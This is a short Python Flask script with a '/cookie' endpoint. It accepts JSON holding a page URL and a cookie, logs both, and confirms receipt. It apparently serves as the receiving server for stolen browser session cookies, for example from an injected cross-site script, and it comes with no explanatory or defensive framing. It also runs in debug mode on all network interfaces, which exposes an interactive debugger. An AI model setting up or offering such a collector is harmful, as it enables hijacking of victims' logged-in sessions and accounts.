from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/cookie', methods=['POST'])
def receive_cookie():
    data = request.get_json()
    if data:
        url = data.get('url', 'unknown url')
        cookie = data.get('cookie', 'no cookie')
        print(f"Cookie from {url}: {cookie}")
        return jsonify({"message": "Cookie received"}), 200
    else:
        return jsonify({"message": "Invalid data"}), 400


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
